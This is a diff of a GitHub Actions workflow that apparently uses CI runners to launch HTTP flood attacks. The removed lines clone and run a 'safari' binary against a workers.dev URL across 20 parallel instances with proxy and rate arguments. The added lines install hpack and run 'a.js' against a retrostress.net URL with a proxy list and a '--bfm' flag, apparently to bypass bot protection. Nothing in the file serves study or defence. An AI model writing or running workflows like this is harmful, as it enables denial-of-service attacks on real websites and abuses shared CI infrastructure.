@@ -13,16 +13,23 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,20]
+        instance: [1, 2]
     
     steps:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Convert line endings and run safari (Instance ${{ matrix.instance }})
+    - name: Setup Node.js
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
+
+    - name: Install dependencies
       run: |
-        git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
-        cd cuddly-octo-bassoon
-        chmod +x safari
-        ./safari    https://vishalpro.vishalkurreyxyz.workers.dev/ 700 10000 8000 new.txt  --cdn --auth
+        npm init -y
+        npm install hpack chalk
+
     
+    - name: Run a.js (Instance ${{ matrix.instance }})
+      run: |
+        node a.js GET https://retrostress.net/auth 700 1  1 proxy.txt --bfm --debug 
